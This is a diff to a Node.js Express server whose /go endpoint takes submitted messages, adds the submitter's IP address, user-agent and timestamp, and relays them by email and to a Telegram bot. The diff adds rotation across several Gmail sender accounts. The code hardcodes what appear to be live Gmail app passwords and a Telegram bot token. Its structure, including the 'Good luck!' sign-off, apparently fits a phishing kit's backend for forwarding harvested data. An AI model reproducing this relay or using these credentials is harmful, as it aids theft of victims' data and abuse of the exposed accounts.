@@ -13,14 +13,14 @@ const port = 3001;
 app.use(cors());
 app.use(bodyParser.json());
 
-// Create a reusable transporter object using SMTP transport
-const transporter = nodemailer.createTransport({
-  service: "gmail", // Change if you're using another SMTP service
-  auth: {
-    user: "serenetides37@gmail.com", // Your email
-    pass: "rmmh cqms dcub denw", // Your app password
-  },
-});
+// List of Gmail accounts and their respective app passwords
+const gmailAccounts = [
+  { user: "serenetides01@gmail.com", pass: "fgta ophs ewdn gfum" },
+  { user: "serenetides37@gmail.com", pass: "rmmh cqms dcub denw" },  // Replace with your actual app passwords
+  { user: "serenetides02@gmail.com", pass: "fqye cfrz nvsg aluc" },
+  { user: "shopperoutreach@gmail.com", pass: "atiu vczo bdgl lwou" },
+  { user: "richard.weeks1945@gmail.com", pass: "ukrt wbph qizo ticu" }
+];
 
 // Telegram Bot setup
 const telegramToken = "7637425229:AAEOd39Gvu7O77XXk_pm5FLDTOPcbxqAP3c"; // Replace with your bot token from BotFather
@@ -55,56 +55,94 @@ app.get("/", (req, res) => {
   res.end("Welcome to my simple API");
 });
 
+// Rotate email accounts function
+const sendEmailWithRotation = (req, subject, message, callback) => {
+  let attempt = 0;
+
+  const tryNextAccount = () => {
+    if (attempt >= gmailAccounts.length) {
+      console.log("All Gmail accounts have been tried, email sending failed.");
+      return callback("failed all", null);
+    }
+
+    const { user, pass } = gmailAccounts[attempt];
+    console.log(`Attempting to send email with: ${user}`); // Diagnostic point
+
+    const transporter = nodemailer.createTransport({
+      service: "gmail", 
+      auth: {
+        user,
+        pass,
+      },
+    });
+
+    // Collect additional information (IP address, browser, timestamp)
+    const ipAddress = req.ip; // IP address of the user
+    const userAgent = req.headers["user-agent"]; // Browser info
+    const timestamp = new Date().toISOString(); // Current timestamp in ISO format
+
+    // Prepare the message to include these details
+    const fullMessage = `*Message* \n${message}\n\n=======================\n*Additional Information*\n=======================\n\n*IP Address* \n${ipAddress}\n\n*Browser* \n${userAgent}\n\n*Timestamp* \n${timestamp}\n\n_Good luck!_`;
+
+    // Define email options
+    const mailOptions = {
+      from: user, // Sender email
+      to: "hey.heatherw@outlook.com", // Recipient email
+      subject: subject, // Subject of the email
+      text: fullMessage, // Email body
+    };
+
+    // Send the email
+    transporter.sendMail(mailOptions, (error, info) => {
+      if (error) {
+        console.log(`Failed to send email with ${user}:`, error); // Diagnostic point
+        attempt++; // Try the next account
+        tryNextAccount();
+      } else {
+        console.log(`Email successfully sent using ${user}.`); // Diagnostic point
+
+        // Send the same message to Telegram using Markdown formatting
+        telegramBot
+          .sendMessage(
+            chatId,
+            `*Subject:* ${subject}\n\n${fullMessage}`,
+            { parse_mode: "Markdown" } // Enable Markdown mode
+          )
+          .then(() => {
+            callback(null, { message: "ET messages 200", info });
+          })
+          .catch((telegramError) => {
+            console.log("Failed to send Telegram message:", telegramError.message); // Diagnostic point
+            callback("Failed to send Telegram message", telegramError.message);
+          });
+      }
+    });
+  };
+
+  // Start trying to send the email with the first account
+  tryNextAccount();
+};
+
 // Email and Telegram notification route
 app.post("/go", (req, res) => {
   const { subject, message } = req.body;
 
   // Validate request body
   if (!subject || !message) {
+    console.log("Request validation failed. Missing subject or message."); // Diagnostic point
     return res.status(400).json({ error: "All fields are required" });
   }
 
-  // Collect additional information (IP address, browser, timestamp)
-  const ipAddress = req.ip; // IP address of the user
-  const userAgent = req.headers["user-agent"]; // Browser info
-  const timestamp = new Date().toISOString(); // Current timestamp in ISO format
+  console.log("Received request to send email and Telegram notification."); // Diagnostic point
 
-  // Prepare the message to include these details
-  const fullMessage = `*Message* \n${message}\n\n=======================\n*Additional Information*\n=======================\n\n*IP Address* \n${ipAddress}\n\n*Browser* \n${userAgent}\n\n*Timestamp* \n${timestamp}\n\n_Good luck!_`;
-
-  // Define email options
-  const mailOptions = {
-    from: "yingyang1446@gmail.com", // Sender email
-    to: "yingyang1446@gmail.com", // Recipient email
-    subject: subject, // Subject of the email
-    text: fullMessage, // Email body
-  };
-
-  // Send the email
-  transporter.sendMail(mailOptions, (error, info) => {
+  sendEmailWithRotation(req, subject, message, (error, result) => {
     if (error) {
-      return res.status(500).json({ error: error.message });
+      console.log("Error occurred while sending email:", error); // Diagnostic point
+      return res.status(500).json({ error });
     }
 
-    // Send the same message to Telegram using Markdown formatting
-    telegramBot
-      .sendMessage(
-        chatId,
-        `*Subject:* ${subject}\n\n${fullMessage}`,
-        { parse_mode: "Markdown" } // Enable Markdown mode
-      )
-      .then(() => {
-        res.status(200).json({
-          message: "Email and Telegram message sent successfully",
-          info,
-        });
-      })
-      .catch((telegramError) => {
-        res.status(500).json({
-          error: "Failed to send Telegram message",
-          details: telegramError.message,
-        });
-      });
+    console.log("Email and Telegram message sent successfully."); // Diagnostic point
+    res.status(200).json(result);
   });
 });
 
@@ -117,7 +155,7 @@ app.post("/telegram-webhook", (req, res) => {
     const text = message.message.text;
 
     // Process the incoming message
-    console.log("Received message:", text);
+    console.log("Received message from Telegram:", text); // Diagnostic point
 
     // Send a response back to the user
     telegramBot.sendMessage(chatId, `You said: ${text}`);
